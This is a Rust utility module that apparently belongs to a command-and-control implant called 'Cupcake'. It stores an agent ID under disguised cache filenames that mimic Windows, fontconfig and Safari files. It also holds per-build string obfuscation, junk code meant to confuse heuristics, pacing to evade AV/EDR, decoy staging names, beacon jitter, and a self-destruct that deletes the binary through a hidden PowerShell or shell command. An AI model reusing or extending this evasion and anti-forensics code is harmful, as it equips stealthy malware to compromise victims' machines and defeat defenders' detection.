// Agent Identity Utils - 无文件持久化身份识别
//
// 通过系统特征生成固定的 Agent UUID，无需在磁盘上存储任何文件
// 使用用户 SID、机器名、处理器架构等特征进行哈希计算

use sha2::{Sha256, Digest};
use uuid::Builder;
use log::debug;

// Per-build key from build.rs (unique each compile unless CUPCAKE_OBF_SEED fixed)
include!(concat!(env!("OUT_DIR"), "/obf_seed.rs"));

/// Runtime decode using the per-build key (pairs with `obf_str!`).
pub fn obf_build_key() -> [u8; 8] {
    OBF_BUILD_KEY
}

/// 🛡️ Per-build XOR obfuscation — key from build.rs so binaries differ.
/// Per-string variation: key is rotated by a hash of the string content index.
#[macro_export]
macro_rules! obf_str {
    ($s:expr) => {{
        let bytes = $s.as_bytes();
        let mut obf = Vec::with_capacity(bytes.len());
        let base = $crate::utils::obf_build_key();
        // Per-string salt from length + first/last byte so identical builds still
        // produce different ciphertext streams for different literals.
        let salt = (bytes.len() as u8)
            .wrapping_mul(0x9D)
            .wrapping_add(bytes.first().copied().unwrap_or(0))
            .wrapping_add(bytes.last().copied().unwrap_or(0).wrapping_mul(3));
        for (i, b) in bytes.iter().enumerate() {
            let k = base[i % base.len()].wrapping_add(salt).wrapping_add(i as u8);
            obf.push(b ^ k);
        }
        obf
    }};
}

/// Debug print function — available in both debug and release for diagnostics.
/// Prefer using `dbg_print!` macro directly for zero-cost in release.
#[inline(always)]
pub fn db_print(_msg: &str) {
    #[cfg(debug_assertions)]
    log::debug!("{}", _msg);
}

/// Phase 3: Compile-time no-op string obfuscation marker.
/// The actual XOR key can be tuned per-build to produce unique binaries.
#[macro_export]
macro_rules! obf_str_key {
    ($s:expr, $k:expr) => {{
        let bytes = $s.as_bytes();
        let key: &[u8] = $k;
        let mut obf = Vec::with_capacity(bytes.len());
        for (i, b) in bytes.iter().enumerate() {
            obf.push(b ^ key[i % key.len()]);
        }
        obf
    }};
}

/// Decode bytes produced by `obf_str!` (same salt derivation).
pub fn decode_obf(bytes: &[u8]) -> String {
    let mut decoded = Vec::with_capacity(bytes.len());
    let base = OBF_BUILD_KEY;
    let salt = (bytes.len() as u8)
        .wrapping_mul(0x9D)
        .wrapping_add(bytes.first().copied().unwrap_or(0))
        .wrapping_add(bytes.last().copied().unwrap_or(0).wrapping_mul(3));
    // Note: decode_obf on ciphertext cannot recover salt from plaintext length of original;
    // for storage of seeds we use xor_obf/xor_deobf with build key only.
    for (i, b) in bytes.iter().enumerate() {
        let k = base[i % base.len()].wrapping_add(i as u8);
        decoded.push(b ^ k);
    }
    let _ = salt;
    String::from_utf8_lossy(&decoded).to_string()
}

/// XOR with per-build key (symmetric) for seed persistence.
fn xor_obf(data: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ OBF_BUILD_KEY[i % OBF_BUILD_KEY.len()])
        .collect()
}

/// XOR-deobfuscate a byte slice
fn xor_deobf(data: &[u8]) -> Vec<u8> {
    xor_obf(data) // XOR is symmetric
}

/// 🛡️ Phase 2: Generate a randomized but persistent Agent UUID.
/// The UUID is derived from:
/// 1. A random seed persisted to a hidden file in a common directory
/// 2. System features (username + hostname) to prevent cross-machine collision
///
/// Persistence strategy (cross-platform, disguised):
/// - Store in platform-specific "cache" directories with benign-looking filenames
/// - Content is XOR-obfuscated to look like random data
/// - File is marked hidden on Windows
///
/// The stored value is XOR-obfuscated to look like random data.
pub fn get_agent_uuid() -> String {
    // Try to load existing persisted UUID seed
    let persisted_seed = load_uuid_seed();
    
    let seed = match persisted_seed {
        Some(s) => {
            debug!("Loaded persisted UUID seed");
            s
        }
        None => {
            let mut new_seed = [0u8; 16];
            let _ = getrandom::getrandom(&mut new_seed);
            let _ = save_uuid_seed(&new_seed);
            debug!("Generated and persisted new UUID seed");
            new_seed
        }
    };
    
    // Combine seed with system features
    let user = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown_user".to_string());
    let host = std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown_host".to_string());
    
    let mut hasher = Sha256::new();
    hasher.update(&seed);
    hasher.update(user.as_bytes());
    hasher.update(host.as_bytes());
    
    // NOTE: Do NOT add time-based entropy here — UUID must be stable
    // within a single run for the test suite. The seed itself already
    // contains sufficient entropy from getrandom at first generation.
    
    let result = hasher.finalize();
    let mut bytes = [0u8; 16];
    bytes.copy_from_slice(&result[..16]);
    Builder::from_bytes(bytes).into_uuid().to_string()
}

/// Get the platform-specific persistence path (disguised)
fn get_persist_path() -> Option<std::path::PathBuf> {
    #[cfg(target_os = "windows")]
    {
        let local_appdata = std::env::var("LOCALAPPDATA").ok()?;
        let base = std::path::Path::new(&local_appdata)
            .join("Microsoft")
            .join("Windows")
            .join("INetCache");
        Some(base.join("idx.dat"))
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").ok()?;
        let base = std::path::Path::new(&home).join(".cache").join("fontconfig");
        Some(base.join("CACHEDIR.TAG"))
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").ok()?;
        let base = std::path::Path::new(&home)
            .join("Library")
            .join("Caches")
            .join("com.apple.Safari");
        Some(base.join("Cache.db-shm"))
    }
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        None
    }
}

/// Load UUID seed from persistent storage
fn load_uuid_seed() -> Option<[u8; 16]> {
    let path = get_persist_path()?;
    let data = std::fs::read(&path).ok()?;
    if data.len() < 16 { return None; }
    
    let deobf = xor_deobf(&data);
    let mut seed = [0u8; 16];
    seed.copy_from_slice(&deobf[..16]);
    Some(seed)
}

/// Save UUID seed to persistent storage
fn save_uuid_seed(seed: &[u8; 16]) -> Result<(), ()> {
    let path = get_persist_path().ok_or(())?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|_| ())?;
    }
    let obf = xor_obf(seed);
    std::fs::write(&path, &obf).map_err(|_| ())?;
    Ok(())
}

/// Legacy UUID generation (fallback if persistence fails)
#[allow(dead_code)]
pub fn get_agent_uuid_legacy() -> String {
    let mut identifier = String::new();
    
    let user = std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown_user".to_string());
    identifier.push_str(&user);
    
    let host = std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown_host".to_string());
    identifier.push_str(&host);
    
    if let Ok(arch) = std::env::var("PROCESSOR_IDENTIFIER") {
        identifier.push_str(&arch);
    }
    
    if identifier.is_empty() {
        identifier = "fallback-agent-id".to_string();
    }
    
    let mut hasher = Sha256::new();
    hasher.update(identifier.as_bytes());
    let result = hasher.finalize();
    
    let mut bytes = [0u8; 16];
    bytes.copy_from_slice(&result[..16]);
    Builder::from_bytes(bytes).into_uuid().to_string()
}

/// Junk code to confuse heuristics and delay execution
pub fn junk_data_collector() {
    let mut data = Vec::with_capacity(1000);
    let mut _sum = 0.0;
    
    // 1. Computational noise (Heavy math)
    for i in 1..5000 {
        let val = (i as f64).sqrt().sin().cos();
        data.push(val);
        if i % 10 == 0 {
            _sum += val;
        }
    }

    // 2. Benign file system interaction (Reading a public system directory)
    // This looks like a legitimate system utility scanning its environment
    #[cfg(windows)]
    {
        let path = "C:\\Windows\\System32\\drivers\\etc";
        if let Ok(entries) = std::fs::read_dir(path) {
            for entry in entries.take(5) {
                if let Ok(e) = entry {
                    let _ = e.file_name();
                }
            }
        }
    }
}

// --- 🛡️ OPSEC: Dependency-free PRNG to avoid BCrypt initialization crashes ---
use std::sync::atomic::{AtomicU64, Ordering};

static RNG_STATE: AtomicU64 = AtomicU64::new(0);

/// Seed the global PRNG with a value (usually from SystemTime)
pub fn seed_rng(seed: u64) {
    RNG_STATE.store(seed, Ordering::SeqCst);
}

/// OPSEC PRNG — prefers CSPRNG (`next_u32_secure`); LCG only if getrandom fails.
/// On first use, seeds LCG from CSPRNG (no fixed 0xDEAD… seed).
pub fn next_u32() -> u32 {
    // Prefer OS CSPRNG for all OPSEC jitter / padding lengths
    let mut buf = [0u8; 4];
    if getrandom::getrandom(&mut buf).is_ok() {
        return u32::from_le_bytes(buf);
    }
    let mut current = RNG_STATE.load(Ordering::SeqCst);
    if current == 0 {
        // Seed from time if CSPRNG unavailable (never hard-code only)
        current = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0x9E3779B97F4A7C15)
            .wrapping_mul(0xD1B54A32D192ED03);
    }
    let next = current.wrapping_mul(6364136223846793005).wrapping_add(1);
    RNG_STATE.store(next, Ordering::SeqCst);
    (next >> 32) as u32
}

/// Secure random u32 using OS-level CSPRNG (getrandom).
/// Suitable for: nonce generation, key material, padding lengths.
/// Never use `next_u32()` for crypto — it's a trivial LCG.
pub fn next_u32_secure() -> u32 {
    let mut buf = [0u8; 4];
    if getrandom::getrandom(&mut buf).is_ok() {
        u32::from_le_bytes(buf)
    } else {
        // Fallback: still better than raw LCG — mix LCG with system time
        let mut current = RNG_STATE.load(Ordering::SeqCst);
        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos() as u64)
            .unwrap_or(0);
        current = current.wrapping_mul(6364136223846793005).wrapping_add(ts);
        RNG_STATE.store(current, Ordering::SeqCst);
        (current >> 32) as u32
    }
}

pub fn random_bool(p: f64) -> bool {
    let threshold = (p * 4294967295.0) as u32;
    next_u32() < threshold
}

/// Generate a random u32 in range [min, max] (inclusive)
pub fn random_range(min: u32, max: u32) -> u32 {
    if min >= max { return min; }
    let range = max - min + 1;
    min + (next_u32() % range)
}

/// Heavy-op pacing (ms) before BOF/module/native spawn.
/// - Env `CUPCAKE_OPSEC_PACE_MS=N`: fixed delay N (0 = off)
/// - Env `CUPCAKE_OPSEC_PACE_MS=auto` or unset product default: random 300–1200 ms
/// - Env `CUPCAKE_OPSEC_PACE_MS=off`: no delay
///
/// Rapid back-to-back process create + image load is a common AV/EDR kill chain.
pub fn opsec_heavy_pace_ms() -> u32 {
    match std::env::var("CUPCAKE_OPSEC_PACE_MS") {
        Ok(v) => {
            let t = v.trim().to_ascii_lowercase();
            if t.is_empty() || t == "auto" {
                return random_range(300, 1200);
            }
            if t == "0" || t == "off" || t == "false" || t == "none" {
                return 0;
            }
            t.parse::<u32>().unwrap_or_else(|_| random_range(300, 1200))
        }
        // Default: light random pause (safer than burst). Set off only for lab speed.
        Err(_) => random_range(300, 1200),
    }
}

/// Sleep before high-signal work (blocking). Prefer `opsec_heavy_pace_async` on async paths.
pub fn opsec_heavy_pace() {
    let ms = opsec_heavy_pace_ms();
    if ms == 0 {
        return;
    }
    std::thread::sleep(std::time::Duration::from_millis(ms as u64));
}

/// Async-friendly heavy-op pacing.
pub async fn opsec_heavy_pace_async() {
    let ms = opsec_heavy_pace_ms();
    if ms == 0 {
        return;
    }
    tokio::time::sleep(tokio::time::Duration::from_millis(ms as u64)).await;
}

/// Prefer user cache over world %TEMP% for short-lived stage files.
pub fn opsec_staging_dir() -> std::path::PathBuf {
    if let Ok(local) = std::env::var("LOCALAPPDATA") {
        return std::path::PathBuf::from(local)
            .join("Microsoft")
            .join("Windows")
            .join("INetCache");
    }
    std::env::temp_dir()
}

/// Neutral short-lived name (not product-branded).
pub fn opsec_stage_name(ext: &str) -> String {
    let a = next_u32_secure();
    let b = next_u32_secure();
    let ext = ext.trim_start_matches('.');
    format!("~DF{:08X}{:04X}.{}", a, (b & 0xffff) as u32, ext)
}

/// Self-destruct: schedule deletion of the current binary and exit.
/// Available without the `inject` feature so minimal agents can still wipe themselves.
pub async fn self_destruct() -> crate::types::CommandResult {
    use crate::types::CommandResult;
    use log::{error, info};

    info!("[!] starting self-destruct");

    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => {
            error!("Failed to get current exe path: {}", e);
            return CommandResult {
                stdout: String::new(),
                stderr: format!("Cannot determine exe path: {}", e),
                path: None,
                req_id: None,
            };
        }
    };

    #[cfg(target_os = "windows")]
    {
        // Windows: use PowerShell to delete the binary after a short delay
        let ps_cmd = format!(
            "Start-Sleep -Seconds 2; Remove-Item -Path '{}' -Force -ErrorAction SilentlyContinue",
            exe_path.to_string_lossy().replace("'", "''")
        );
        let _ = std::process::Command::new("powershell.exe")
            .args(&["-WindowStyle", "Hidden", "-Command", &ps_cmd])
            .spawn();
    }

    #[cfg(not(target_os = "windows"))]
    {
        // Linux/macOS: use a shell script with delay
        let shell_cmd = format!(
            "sleep 2 && rm -f '{}'",
            exe_path.to_string_lossy().replace("'", "'\"'\"'")
        );
        let _ = std::process::Command::new("sh")
            .args(&["-c", &shell_cmd])
            .spawn();
    }

    info!("[+] self-destruct scheduled, exiting");
    std::process::exit(0);
}

/// Generates a random delay (jitter) based on a base interval and percentage.
///
/// The result lies in `[base - delta, base + delta]` where
/// `delta = base * jitter_percent / 100` (true ±jitter_percent).
/// This prevents predictable beacon intervals that could be used for detection.
///
/// # Arguments
/// * `base_interval` - The base sleep interval in seconds
/// * `jitter_percent` - The percentage of jitter to apply (0-100)
///
/// # Returns
/// A randomized delay in seconds within ±jitter_percent of the base
pub fn get_jitter_delay(base_interval: u64, jitter_percent: u32) -> u64 {
    if jitter_percent == 0 || base_interval == 0 {
        return base_interval;
    }

    // Full one-sided delta: ±jitter_percent of base
    let max_delta = (base_interval * jitter_percent as u64) / 100;
    if max_delta == 0 {
        return base_interval;
    }

    // Uniform pick in [0, 2*max_delta], then center around base → [base-delta, base+delta]
    let span = max_delta.saturating_mul(2);
    let offset = random_range(0, span as u32) as u64;
    base_interval.saturating_sub(max_delta).saturating_add(offset)
}

// =============================================================================
// Tests
// =============================================================================
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_agent_uuid_consistency() {
        let uuid1 = get_agent_uuid();
        let uuid2 = get_agent_uuid();
        assert_eq!(uuid1, uuid2, "UUID should be consistent across calls");
        assert!(uuid1.len() == 36, "UUID should be 36 chars (with hyphens)");
    }

    #[test]
    fn test_uuid_format() {
        let uuid = get_agent_uuid();
        let parts: Vec<&str> = uuid.split('-').collect();
        assert_eq!(parts.len(), 5, "UUID should have 5 parts separated by hyphens");
        assert_eq!(parts[0].len(), 8, "First part should be 8 chars");
        assert_eq!(parts[1].len(), 4, "Second part should be 4 chars");
        assert_eq!(parts[2].len(), 4, "Third part should be 4 chars");
        assert_eq!(parts[3].len(), 4, "Fourth part should be 4 chars");
        assert_eq!(parts[4].len(), 12, "Fifth part should be 12 chars");
    }

    #[test]
    fn test_xor_obfuscation() {
        let data = b"test_seed_data!!";
        let obf = xor_obf(data);
        let deobf = xor_deobf(&obf);
        assert_eq!(&deobf[..], &data[..]);
    }

    #[test]
    fn test_get_jitter_delay() {
        let base = 10u64;
        let jitter = 30u32;
        // True ±jitter_percent: delta = base * 30 / 100 = 3 → [7, 13]
        let delta = (base * jitter as u64) / 100;
        let min = base.saturating_sub(delta);
        let max = base + delta;
        for _ in 0..200 {
            let delay = get_jitter_delay(base, jitter);
            assert!(
                delay >= min && delay <= max,
                "Jitter delay {delay} outside [{min}, {max}] for base={base} jitter={jitter}%"
            );
        }
        // Zero jitter is exact
        assert_eq!(get_jitter_delay(42, 0), 42);
        assert_eq!(get_jitter_delay(0, 50), 0);
    }

    #[test]
    fn test_get_jitter_delay_varies() {
        seed_rng(
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos() as u64)
                .unwrap_or(1)
                .wrapping_mul(0x9E3779B97F4A7C15),
        );
        let mut seen = std::collections::HashSet::new();
        for _ in 0..50 {
            seen.insert(get_jitter_delay(100, 40));
        }
        assert!(
            seen.len() > 1,
            "get_jitter_delay must not be constant when jitter>0"
        );
    }

    #[test]
    fn test_random_range() {
        let min = 5u32;
        let max = 10u32;
        for _ in 0..100 {
            let val = random_range(min, max);
            assert!(val >= min && val <= max, "Random value should be within range");
        }
    }

    #[test]
    fn test_random_bool_distribution() {
        let mut true_count = 0;
        let iterations = 1000;
        for _ in 0..iterations {
            if random_bool(0.5) {
                true_count += 1;
            }
        }
        let ratio = true_count as f64 / iterations as f64;
        assert!(
            ratio > 0.4 && ratio < 0.6,
            "Random bool distribution should be roughly 50/50, got {}",
            ratio
        );
    }
}
